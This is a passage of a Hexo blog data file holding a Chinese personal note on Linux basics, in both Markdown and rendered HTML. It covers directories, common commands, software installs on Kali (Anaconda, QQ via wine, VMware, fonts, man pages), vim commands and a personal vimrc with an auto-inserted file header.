&filetype == 'sh' \n          call setline(1,\"\\############################\") \n          call append(line(\".\"), \"\\# File Name: \".expand(\"%\")) \n          call append(line(\".\")+1, \"\\# Author: Li Ziqiang\") \n          call append(line(\".\")+2, \"\\# mail: 2296557984@qq.com\") \n          call append(line(\".\")+3, \"\\# Created Time: \".strftime(\"%c\"))\n          call append(line(\".\")+4, \"\\############################\") \n          call append(line(\".\")+5, \"\\#!/bin/bash\") \n          call append(line(\".\")+6, \"\") \n      else \n          call setline(1, \"/******************************\") \n          call append(line(\".\"), \"    > File Name: \".expand(\"%\")) \n          call append(line(\".\")+1, \"    > Author:Li Ziqiang\") \n          call append(line(\".\")+2, \"    > Mail: 2296557984@qq.com \") \n          call append(line(\".\")+3, \"    > Created Time: \".strftime(\"%c\")) \n          call append(line(\".\")+4, \" *****************************/\") \n          call append(line(\".\")+5, \"\")\n      endif\n  \n      \"新建文件后，自动定位到文件末尾\n      autocmd BufNewFile * normal G\n  endfunc \n  \n  ```\n\n  \n","source":"_posts/Linux基础.md","raw":"---\ntitle: Linux基础操作\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_10.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: linux\ntags: [linux, kali]   # 可以是数组\ntop: false\n---\n\n[本笔记的友情链接](https://book.apeland.cn/details/189/)\n\n## 常用目录介绍\n\n1. boot    存放启动文件\n2. dev     存放设备文件\n3. etc     存放配置文件\n4. home    普通用户家目录，以/home/$username的方式存放\n5. media   移动存储自动挂载目录,以 /media/$device_name的方式来存放\n6. mnt     手动挂载目录\n7. opt     三方软件安装目录\n8. proc    内存系统文件\n9. root    管理员家目录\n10. run     里面的东西是系统运行时需要的, 不能随便删除. 但是重启的时候应该抛弃. 下次系统运行时重新生成\n11. srv     服务相关数据\n12. sys     系统文件\n13. tmp     临时文件夹\n14. usr     存放库文件、文档、命令、用户数据等\n15. var     日志存放lib     库文件\n<!--more-->\n- -echo相当于python中的print，即输出、打印的意思\n\n## linux基本命令\n### 命令[命令选项][参数]\n​    {必选项}， [可选项]\n\n1）清屏命令：clear      快捷键  ctrl+l\n2）帮助命令：man\n3）进入文件夹命令: cd  【change dir，cd理解为改变目录的意思】\n4）列出当前目录内容命令：ls   [-a -l -d ] 【list】\n5）显示主机名：hostname\n6）显示日期时间：date [-s %F]\n7）显示日历：cal\n8）计算器：bc\n9）重启命令：reboot     shutdown -r      init 6\n10）注销命令：logout\n11）关机命令：halt      shutdown -h         init 0\n12) 显示当前操作系统和机器的信息: uname\n13) 显示当前路径: pwd 【定位自己的位置】\n\n-多个命令选项可以用一个 — 拼凑在一起，若命令产生了冲突，则以排最后的为主\n-命令选项写全称时，前面加 — —\n\n\n\n- 从命令行启动图形界面的默认图片查看器\n\n  ​\t运行命令：xdg-open filename.png\n\n- 在命令行打开一个图片:\n\n   1. apt install fim\n\n   2. fim filename.png\n\n      + fim是fbi的升级版\n\n        [有关于fim的操作链接](http://www.itpro.net.cn/2019/12/linux)\n\n- apt 与apt-get 的区别：apt-get 是 apt 的子集\n\n- 更新安装包：apt upgrade\n\n\n\n### 安装内核头文件\n\n- 输入命令：apt-get install linux-headers-$(uname -r)或者直接敲apt-get install linux-headers-在这时候你按键盘上的tab键，找你本系统的头文件安装即可\n\n\n\n### 安装照相机\n\n```\nsudo apt install cheese\n```\n\n\n\n### u盘修改只读模式\n\n1. 查看U盘分区\n\n```\nsudo fdisk -l\n```\n\n2. 查看U盘的挂载点\n\n```\ndf U盘分区\n```\n\n3. 卸载原挂载的U盘\n4. 修复U盘的文件管理系统\n\n```\nsudo dosfsck -v -a [U盘分区]\n```\n\n5. 重新挂载\n\n\n\n### 蓝牙\n\n```\nsudo service bluetooth start  //打开蓝牙配适器\nsudo service bluetooth stop   //关闭蓝牙配适器\n```\n\n### 关闭进程\n\n- 有时候应用被我们1关闭了，可它还在后台运行，这就要求我们手动关闭进程\n- kill -9 进程IP    //可利用htop命令查看进程IP\n- 若没有htop，可下载\n\n```\nsudo apt install htop\n```\n\n\n\n### 卸载 IntelliJ IDEA(类似卸载可参考)\n\n1. 寻找Intellij IDEA 里面是否有uninstall.sh文件，有就能直接卸载\n2. 若没有，则在里面找说明文档，找到相关配置文件所在的目录，将IntelliJ IDEA 文件夹及其相关配置文件一起删除\n3. 可能会存在开始菜单栏里依然有图标显示的问题，\n\n```\ncd ~/.local/share/applications\n```\n\n4. 之后在applications文件夹里找到相对应的配置文件删除即可\n\n\n\n\n\n### linux换源\n\n- 进入目录  /etc/apt/\n- sudo vim source.list\n- 上网寻找适合自己的源\n\n\n\n### 关于Anaconda的安装\n\n- 在清华镜像站下载Anaconda\n\n- 安装后修改环境变量\n\n  - sudo vim /etc/profile\n\n  - 向里面写入  export PATH=$PATH:/home/balacksheep/anaconda3/bin:$PATH\n\n       \t\t\t\t\t\t%%blacksheep为用户名，应选择自己的路\t\t\t\t\t\t\t径配置环境变量\n\n- 安装后命令行使用时前面有base，代表安装成功，不需要去掉base，对使用无影响\n\n- 更换anaconda的源，以清华源举例：\n\n  - sudo vim ~/.condarc\n\n  - 向里面写入：\n\n    \n\n    ```\n    channels:\n    https://mirrors.ustc.edu.cn/anaconda/pkgs/main/\n    https://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/\n    https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/\n    defaults\n    show_channel_urls: true\n    ```\n  \n  \n\n\n### 关于qq的安装问题\n\n- 在kali系统中，输入wine，系统会自动提示你wine未安装，此时按照提示给的步骤来就行了\n- 关于字体问题：qq安装好了后会发现有些字体变成了乱码，此时可以安装一些字体来解决\n\n```\napt-get install xfonts-intl-chinese\napt-get install ttf-wqy-microhei\n```\n\n- 关于QQ用wine装好后找不到的问题\n  + wine 默认被配置成home文件下的隐藏文件，cd .wine即可调出\n  + 输入~/.wine/drive_c/Program Files (x86)/Tencent/QQ/Bin\n  + 你会发现里面优QQ.exe文件，输入wine QQ 或wine QQ.exe即可调出QQ程序\n  + 为了方便，可以把QQ/Bin 放到home文件下\n\n\n\n### 关于输入法的问题\n\n- 搜狗输入法兼容性不咋地，反正安装了很多遍都不行\n- 谷歌输入法可以用，基于小企鹅输入法使用，但是也不咋地，毕竟是外国人做的中国输入法，不怎么走心\n- 推荐使用百度输入法，基于小企鹅输入法，首先上官网搜索压缩包，解压后找到安装包文件进行安装，最重要一点是安装后关机重启，重启后系统会自动帮助你进行百度输入法的一些个性化的设置，接着到输入法设置中应用百度输入法就OK了\n\n### wps字体问题\n\n- 使用wps for linux2019 时可能有些中文字体会出现乱码，原因是系统缺失相应的字体\n- 将Windows系统下的Windows目录中的Fonts文件夹复制到Linux系统中的/usr/share/fonts/目录下，再执行以下命令\n\n```\nsudo fc-cache -fv     //识别字体库\n\nfc-list :lang=zh-cn | sort    //确认是否安装\n```\n\n\n\n\n\n### 关于vmware 虚拟机安装\n\n1. 官网下载虚拟机最新版本\n2. chmod -x 下载的文件\n3. sudo bash 下载的文件\n4. 之后就可以在电脑中找到虚拟机，并进行下一步的安装操作\n\n### linux-vmware升级问题\n\n[解决 linux升级 导致VMware启动出现\"before you can run vmware workstation, serveral modules must be complied and loaded into the runing kernel\" 而无法卸载](https://www.cnblogs.com/wjshan0808/p/4110495.html)\n\n```\n# vmware-uninstall \nYou have gotten this message because you are either downgrading VMware\nWorkstation, Player, or VIX, or because you attempted to run either\nvmware-uninstall or vmware-uninstall-vix.\n\nIf you are downgrading, please uninstall all newer versions first, then\ninstall again.\n\nThe vmware-uninstall* scripts have been deprecated.  Instead, please use\nthe vmware-installer.\n\nLong form:\n      vmware-installer --uninstall-product PRODUCT\nShort form:\n      vmware-installer -u PRODUCT\n\nWhere PRODUCT is one of vmware-workstation, vmware-player, or vmware-vix.\n\nFor a list of which products are installed, you may run:\n      vmware-installer --list-products\nor:\n      vmware-installer -l\n\n\n# vmware-installer -l\nProduct Name         Product Version     \n==================== ====================\nvmware-workstation   10.0.4.2249910      \n# vmware-installer -u vmware-workstation\n```\n\n\n\n### man 中文手册下载\n\n1. Debian / Ubuntu安装\n\n```\nsudo apt update\nsudo apt install manpages-zh\n```\n\n2. Arch Linux:\n\n```\npacman -Syu\npacman -S man-pages-zh_cn man-pages-zh_tw\n```\n\n3. Red Hat / CentOS:\n\n```\nyum update\nyum install man-pages-zh-CN\n```\n\n4. Fedora:\n\n```\ndnf update\ndnf install man-pages-zh-CN\n```\n\n\n\n### kali内核更新安装\n\n1. 查看内核版本\n\n```\nuname -r\n```\n\n2. 检查linux是否安装对应的头文件\n\n```\nsudo apt-cache search linux-headers\n```\n\n3. 安装更新头文件\n\n```\nsudo apt install linux-headers-$(uname -r)\n```\n\n4. 内核头文件检测是否安装\n\n```\nsudo dpkg-query -s linux-headers-`uname -r`\n```\n\n\n\n### vim命令\n\n1. :set number 显示行号\n2. :set 取消行号\n3. xG:跳转到指定的第x行，G移动到文件末尾行\n4. dd ：剪切一行， yy：复制一行\n5. D：剪切一个字符，y：复制一个字符\n6. p：粘贴\n7. dxw：删除光标右边x个字符\n8. dxh：删除光标左边x个字符\n9. :x 删除一个字符\n10. /string :查找字符 n:向上查找，N：向下查找\n11. :范围 s/oldword/newword/g  字符替换 %s全文查找，g为global，全局替换\n\n- vim规则总结\n\n（1）一般是操作字符+被操作的量\n\n（2）$ 为结尾， 0 为开头\n\n- vim简单配置：\n\n  \n\n  ```c\n  \"===================\n  \"适合自己用的vimrc配置文件\n  \"===================\n  \n  \"设置编码\n  set fileencodings=utf-8,ucs-bom,gb18030,gbk,gb2312,cp936\n  set termencoding=utf-8\n  set encoding=utf-8\n  \n  \"保存.vimrc文件时自动重启加载，即让此文件立即生效\n  autocmd BufWritePost $MYVIMRC source $MYVIMRC\n  \n  \"语法高亮\n  syntax on\n  \n  \"设置ruler会在右下角显示光标所在的行号和列号,不方便查看,改成设置状态栏显示内容\n  \"set ruler\n  \n  \"设置状态行显示的内容. %F: 显示当前文件的完整路径. %r: 如果readonly,会显示[RO]\n  \"%B: 显示光标下字符的编码值,十六进制. %l:光标所在的行号. %v:光标所在的虚拟列号.\n  \"%P: 显示当前内容在整个文件中的百分比. %H和%M是strftime()函数的参数,获取时间.\n  set statusline=%F%r\\ [HEX=%B][%l,%v,%P]\\ %{strftime(\\\"%H:%M\\\")}\n  \n  \"显示行号\n  set nu \"等同于 set number\n  \n  \"突出显示当前行\n  set cursorline \"等同于 set cul\n  \n  \"突出显示当前列\n  set cursorcolumn \"等同于 set cuc\n  \n  \"共享剪贴板  \n  set clipboard+=unnamed \n  \n  \"从不备份  \n  set nobackup\n  \n  \"自动保存\n  set autowrite\n  \n  \"隐藏工具栏\n  \"set guioptions-=T\n  \"隐藏菜单栏\n  \"set guioptions-=m\n  \n  \"高亮显示所有搜索到的内容.后面用map映射快捷键来方便关闭当前搜索的高亮.\n  \"set hlsearch\n  \n  \"光标立刻跳转到搜索到内容\n  \"set incsearch\n  \n  \"搜索到最后匹配的位置后,再次搜索不回到第一个匹配处\n  \"set nowrapscan\n  \n  \"去掉输入错误时的提示声音\n  set noeb\n  \n  \" 默认按下Esc后,需要等待1秒才生效,设置Esc超时时间为100ms,尽快生效\n  set ttimeout\n  set ttimeoutlen=100\n  \n  \"在处理未保存或只读文件的时候，弹出确认\n  set confirm\n  \n  \"让Backspace键可以往前删除字符.\n  \"Debian系统自带的vim版本会加载一个debian.vim文件,默认已经设置这一项,\n  \"可以正常使用Backspace键.如果使用自己编译的vim版本,并自行配置.vimrc文件,\n  \"可能就没有设置这一项,导致Backspace键用不了,或者时灵时不灵.所以主动配置.\n  \"使回格键（backspace）正常处理indent, eol, start等\n  set backspace=indent,eol,start\n  \n  \"允许backspace和光标键跨越行边界\n  \"set whichwrap+=<,>,h,l\n  \n  \"去掉有关vi一致性模式,避免操作习惯上的局限.\n  set nocompatible\n  \n  \"FIXME 在MS-DOS控制台打开vim时,控制台使用鼠标右键来复制粘贴,设置\n  \"全鼠标模式,鼠标右键被映射为visual mode,不能用来复制粘贴,不方便.\n  \"但是如果不设置鼠标模式,会无法使用鼠标滚轮来滚动界面.经过验证,发现\n  \"可以设成普通模式mouse=n来使用鼠标滚轮,也能使用鼠标右键复制粘贴.\n  \" mouse=c/mouse=i模式都不能用鼠标滚轮. Linux下还是要设成 mouse=a\n  set mouse=n\n  \"set selection=exclusive\n  \"set selectmode=mouse,key\n  \n  \"高亮显示括号匹配\n  set showmatch\n  \n  \"设置Tab长度为4空格\n  set tabstop=4\n  \"设置自动缩进长度为4空格\n  set shiftwidth=4\n  \"自动缩进,这个导致从外面拷贝多行以空格开头的内容时,会有多的缩进,先不设置\n  \"set autoindent\n  \"不要用空格代替制表符\n  set noexpandtab\n  \"输入tab制表符时，自动替换成空格\n  \"set expandtab\n  \"设置softtabstop有一个好处是可以用Backspace键来一次删除4个空格.\n  \"softtabstop的值为负数,会使用shiftwidth的值,两者保持一致,方便统一缩进.\n  \"set softtabstop=4\n  \n  \n  \"显示空格和tab键\n  set listchars=tab:>-,trail:-\n  \n  \"1=启动显示状态行, 2=总是显示状态行.设置总是显示状态行,方便看到当前文件名\n  set laststatus=2\n  \n  \"自动补全\n  :inoremap ( ()<ESC>i\n  :inoremap ) <c-r>=ClosePair(')')<CR>\n  :inoremap { {<CR>}<ESC>O\n  :inoremap } <c-r>=ClosePair('}')<CR>\n  :inoremap [ []<ESC>i\n  :inoremap ] <c-r>=ClosePair(']')<CR>\n  :inoremap \" \"\"<ESC>i\n  :inoremap ' ''<ESC>i\n  function! ClosePair(char)\n      if getline('.')[col('.') - 1] == a:char\n          return \"\\<Right>\"\n      else\n          return a:char\n      endif\n  endfunction \n  \"打开文件类型检测,并载入文件类型插件,为特定文件类型载入相关缩进文\n  filetype plugin indent on\n  \" 设置自动补全的选项. longest表示只自动补全最大匹配的部分,剩余部分通过\n  \" CTRL-P/CTRL-N来选择匹配项进行补全. menu表示弹出可补全的内容列表.\n  \" 如果有多个匹配,longest选项不会自动选中并完整补全,要多按一次CTRL-P,比较\n  \" 麻烦,不做设置,保持默认设置,vim默认没有设置longest.\n  \"set completeopt=longest,menu \"启用这句才会开启自动补全\n  \n  \n  \"=============显示中文帮助\n  if version >= 603\n      set helplang=cn\n      set encoding=utf-8\n  endif\n  \n  \"=============新建.c,.h,.sh,.java文件，自动插入文件头 \n  autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec \":call SetTitle()\" \n  \"\"定义函数SetTitle，自动插入文件头 \n  func SetTitle() \n      \"如果文件类型为.sh文件 \n      if &filetype == 'sh' \n          call setline(1,\"\\############################\") \n          call append(line(\".\"), \"\\# File Name: \".expand(\"%\")) \n          call append(line(\".\")+1, \"\\# Author: Li Ziqiang\") \n          call append(line(\".\")+2, \"\\# mail: 2296557984@qq.com\") \n          call append(line(\".\")+3, \"\\# Created Time: \".strftime(\"%c\"))\n          call append(line(\".\")+4, \"\\############################\") \n          call append(line(\".\")+5, \"\\#!/bin/bash\") \n          call append(line(\".\")+6, \"\") \n      else \n          call setline(1, \"/******************************\") \n          call append(line(\".\"), \"    > File Name: \".expand(\"%\")) \n          call append(line(\".\")+1, \"    > Author:Li Ziqiang\") \n          call append(line(\".\")+2, \"    > Mail: 2296557984@qq.com \") \n          call append(line(\".\")+3, \"    > Created Time: \".strftime(\"%c\")) \n          call append(line(\".\")+4, \" *****************************/\") \n          call append(line(\".\")+5, \"\")\n      endif\n  \n      \"新建文件后，自动定位到文件末尾\n      autocmd BufNewFile * normal G\n  endfunc \n  \n  ```\n\n  \n","slug":"Linux基础","published":1,"updated":"2021-06-20T02:58:16.580Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzaxj00077vvt80oeco27","content":"<p><a href=\"https://book.apeland.cn/details/189/\">本笔记的友情链接</a></p>\n<h2 id=\"常用目录介绍\"><a href=\"#常用目录介绍\" class=\"headerlink\" title=\"常用目录介绍\"></a>常用目录介绍</h2><ol>\n<li>boot    存放启动文件</li>\n<li>dev     存放设备文件</li>\n<li>etc     存放配置文件</li>\n<li>home    普通用户家目录，以/home/$username的方式存放</li>\n<li>media   移动存储自动挂载目录,以 /media/$device_name的方式来存放</li>\n<li>mnt     手动挂载目录</li>\n<li>opt     三方软件安装目录</li>\n<li>proc    内存系统文件</li>\n<li>root    管理员家目录</li>\n<li>run     里面的东西是系统运行时需要的, 不能随便删除. 但是重启的时候应该抛弃. 下次系统运行时重新生成</li>\n<li>srv     服务相关数据</li>\n<li>sys     系统文件</li>\n<li>tmp     临时文件夹</li>\n<li>usr     存放库文件、文档、命令、用户数据等</li>\n<li>var     日志存放lib     库文件<span id=\"more\"></span></li>\n</ol>\n<ul>\n<li>-echo相当于python中的print，即输出、打印的意思</li>\n</ul>\n<h2 id=\"linux基本命令\"><a href=\"#linux基本命令\" class=\"headerlink\" title=\"linux基本命令\"></a>linux基本命令</h2><h3 id=\"命令-命令选项-参数\"><a href=\"#命令-命令选项-参数\" class=\"headerlink\" title=\"命令[命令选项][参数]\"></a>命令[命令选项][参数]</h3><p>​    {必选项}， [可选项]</p>\n<p>1）清屏命令：clear      快捷键  ctrl+l<br>2）帮助命令：man<br>3）进入文件夹命令: cd  【change dir，cd理解为改变目录的意思】<br>4）列出当前目录内容命令：ls   [-a -l -d ] 【list】<br>5）显示主机名：hostname<br>6）显示日期时间：date [-s %F]<br>7）显示日历：cal<br>8）计算器：bc<br>9）重启命令：reboot     shutdown -r      init 6<br>10）注销命令：logout<br>11）关机命令：halt      shutdown -h         init 0<br>12) 显示当前操作系统和机器的信息: uname<br>13) 显示当前路径: pwd 【定位自己的位置】</p>\n<p>-多个命令选项可以用一个 — 拼凑在一起，若命令产生了冲突，则以排最后的为主<br>-命令选项写全称时，前面加 — —</p>\n<ul>\n<li><p>从命令行启动图形界面的默认图片查看器</p>\n<p>​    运行命令：xdg-open filename.png</p>\n</li>\n<li><p>在命令行打开一个图片:</p>\n<ol>\n<li><p>apt install fim</p>\n</li>\n<li><p>fim filename.png</p>\n<ul>\n<li><p>fim是fbi的升级版</p>\n<p><a href=\"http://www.itpro.net.cn/2019/12/linux\">有关于fim的操作链接</a></p>\n</li>\n</ul>\n</li>\n</ol>\n</li>\n<li><p>apt 与apt-get 的区别：apt-get 是 apt 的子集</p>\n</li>\n<li><p>更新安装包：apt upgrade</p>\n</li>\n</ul>\n<h3 id=\"安装内核头文件\"><a href=\"#安装内核头文件\" class=\"headerlink\" title=\"安装内核头文件\"></a>安装内核头文件</h3><ul>\n<li>输入命令：apt-get install linux-headers-$(uname -r)或者直接敲apt-get install linux-headers-在这时候你按键盘上的tab键，找你本系统的头文件安装即可</li>\n</ul>\n<h3 id=\"安装照相机\"><a href=\"#安装照相机\" class=\"headerlink\" title=\"安装照相机\"></a>安装照相机</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install cheese</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"u盘修改只读模式\"><a href=\"#u盘修改只读模式\" class=\"headerlink\" title=\"u盘修改只读模式\"></a>u盘修改只读模式</h3><ol>\n<li>查看U盘分区</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo fdisk -l</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>查看U盘的挂载点</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">df U盘分区</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>卸载原挂载的U盘</li>\n<li>修复U盘的文件管理系统</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo dosfsck -v -a [U盘分区]</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>重新挂载</li>\n</ol>\n<h3 id=\"蓝牙\"><a href=\"#蓝牙\" class=\"headerlink\" title=\"蓝牙\"></a>蓝牙</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo service bluetooth start  //打开蓝牙配适器</span><br><span class=\"line\">sudo service bluetooth stop   //关闭蓝牙配适器</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关闭进程\"><a href=\"#关闭进程\" class=\"headerlink\" title=\"关闭进程\"></a>关闭进程</h3><ul>\n<li>有时候应用被我们1关闭了，可它还在后台运行，这就要求我们手动关闭进程</li>\n<li>kill -9 进程IP    //可利用htop命令查看进程IP</li>\n<li>若没有htop，可下载</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt install htop</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"卸载-IntelliJ-IDEA-类似卸载可参考\"><a href=\"#卸载-IntelliJ-IDEA-类似卸载可参考\" class=\"headerlink\" title=\"卸载 IntelliJ IDEA(类似卸载可参考)\"></a>卸载 IntelliJ IDEA(类似卸载可参考)</h3><ol>\n<li>寻找Intellij IDEA 里面是否有uninstall.sh文件，有就能直接卸载</li>\n<li>若没有，则在里面找说明文档，找到相关配置文件所在的目录，将IntelliJ IDEA 文件夹及其相关配置文件一起删除</li>\n<li>可能会存在开始菜单栏里依然有图标显示的问题，</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd ~/.local/share/applications</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>之后在applications文件夹里找到相对应的配置文件删除即可</li>\n</ol>\n<h3 id=\"linux换源\"><a href=\"#linux换源\" class=\"headerlink\" title=\"linux换源\"></a>linux换源</h3><ul>\n<li>进入目录  /etc/apt/</li>\n<li>sudo vim source.list</li>\n<li>上网寻找适合自己的源</li>\n</ul>\n<h3 id=\"关于Anaconda的安装\"><a href=\"#关于Anaconda的安装\" class=\"headerlink\" title=\"关于Anaconda的安装\"></a>关于Anaconda的安装</h3><ul>\n<li><p>在清华镜像站下载Anaconda</p>\n</li>\n<li><p>安装后修改环境变量</p>\n<ul>\n<li><p>sudo vim /etc/profile</p>\n</li>\n<li><p>向里面写入  export PATH=$PATH:/home/balacksheep/anaconda3/bin:$PATH</p>\n<pre><code>                       %%blacksheep为用户名，应选择自己的路                            径配置环境变量\n</code></pre>\n</li>\n</ul>\n</li>\n<li><p>安装后命令行使用时前面有base，代表安装成功，不需要去掉base，对使用无影响</p>\n</li>\n<li><p>更换anaconda的源，以清华源举例：</p>\n<ul>\n<li><p>sudo vim ~/.condarc</p>\n</li>\n<li><p>向里面写入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">channels:</span><br><span class=\"line\">https://mirrors.ustc.edu.cn/anaconda/pkgs/main/</span><br><span class=\"line\">https://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/</span><br><span class=\"line\">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class=\"line\">defaults</span><br><span class=\"line\">show_channel_urls: true</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"关于qq的安装问题\"><a href=\"#关于qq的安装问题\" class=\"headerlink\" title=\"关于qq的安装问题\"></a>关于qq的安装问题</h3><ul>\n<li>在kali系统中，输入wine，系统会自动提示你wine未安装，此时按照提示给的步骤来就行了</li>\n<li>关于字体问题：qq安装好了后会发现有些字体变成了乱码，此时可以安装一些字体来解决</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install xfonts-intl-chinese</span><br><span class=\"line\">apt-get install ttf-wqy-microhei</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>关于QQ用wine装好后找不到的问题<ul>\n<li>wine 默认被配置成home文件下的隐藏文件，cd .wine即可调出</li>\n<li>输入~/.wine/drive_c/Program Files (x86)/Tencent/QQ/Bin</li>\n<li>你会发现里面优QQ.exe文件，输入wine QQ 或wine QQ.exe即可调出QQ程序</li>\n<li>为了方便，可以把QQ/Bin 放到home文件下</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"关于输入法的问题\"><a href=\"#关于输入法的问题\" class=\"headerlink\" title=\"关于输入法的问题\"></a>关于输入法的问题</h3><ul>\n<li>搜狗输入法兼容性不咋地，反正安装了很多遍都不行</li>\n<li>谷歌输入法可以用，基于小企鹅输入法使用，但是也不咋地，毕竟是外国人做的中国输入法，不怎么走心</li>\n<li>推荐使用百度输入法，基于小企鹅输入法，首先上官网搜索压缩包，解压后找到安装包文件进行安装，最重要一点是安装后关机重启，重启后系统会自动帮助你进行百度输入法的一些个性化的设置，接着到输入法设置中应用百度输入法就OK了</li>\n</ul>\n<h3 id=\"wps字体问题\"><a href=\"#wps字体问题\" class=\"headerlink\" title=\"wps字体问题\"></a>wps字体问题</h3><ul>\n<li>使用wps for linux2019 时可能有些中文字体会出现乱码，原因是系统缺失相应的字体</li>\n<li>将Windows系统下的Windows目录中的Fonts文件夹复制到Linux系统中的/usr/share/fonts/目录下，再执行以下命令</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo fc-cache -fv     //识别字体库</span><br><span class=\"line\"></span><br><span class=\"line\">fc-list :lang=zh-cn | sort    //确认是否安装</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"关于vmware-虚拟机安装\"><a href=\"#关于vmware-虚拟机安装\" class=\"headerlink\" title=\"关于vmware 虚拟机安装\"></a>关于vmware 虚拟机安装</h3><ol>\n<li>官网下载虚拟机最新版本</li>\n<li>chmod -x 下载的文件</li>\n<li>sudo bash 下载的文件</li>\n<li>之后就可以在电脑中找到虚拟机，并进行下一步的安装操作</li>\n</ol>\n<h3 id=\"linux-vmware升级问题\"><a href=\"#linux-vmware升级问题\" class=\"headerlink\" title=\"linux-vmware升级问题\"></a>linux-vmware升级问题</h3><p><a href=\"https://www.cnblogs.com/wjshan0808/p/4110495.html\">解决 linux升级 导致VMware启动出现”before you can run vmware workstation, serveral modules must be complied and loaded into the runing kernel” 而无法卸载</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># vmware-uninstall </span><br><span class=\"line\">You have gotten this message because you are either downgrading VMware</span><br><span class=\"line\">Workstation, Player, or VIX, or because you attempted to run either</span><br><span class=\"line\">vmware-uninstall or vmware-uninstall-vix.</span><br><span class=\"line\"></span><br><span class=\"line\">If you are downgrading, please uninstall all newer versions first, then</span><br><span class=\"line\">install again.</span><br><span class=\"line\"></span><br><span class=\"line\">The vmware-uninstall* scripts have been deprecated.  Instead, please use</span><br><span class=\"line\">the vmware-installer.</span><br><span class=\"line\"></span><br><span class=\"line\">Long form:</span><br><span class=\"line\">      vmware-installer --uninstall-product PRODUCT</span><br><span class=\"line\">Short form:</span><br><span class=\"line\">      vmware-installer -u PRODUCT</span><br><span class=\"line\"></span><br><span class=\"line\">Where PRODUCT is one of vmware-workstation, vmware-player, or vmware-vix.</span><br><span class=\"line\"></span><br><span class=\"line\">For a list of which products are installed, you may run:</span><br><span class=\"line\">      vmware-installer --list-products</span><br><span class=\"line\">or:</span><br><span class=\"line\">      vmware-installer -l</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># vmware-installer -l</span><br><span class=\"line\">Product Name         Product Version     </span><br><span class=\"line\">==================== ====================</span><br><span class=\"line\">vmware-workstation   10.0.4.2249910      </span><br><span class=\"line\"># vmware-installer -u vmware-workstation</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"man-中文手册下载\"><a href=\"#man-中文手册下载\" class=\"headerlink\" title=\"man 中文手册下载\"></a>man 中文手册下载</h3><ol>\n<li>Debian / Ubuntu安装</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 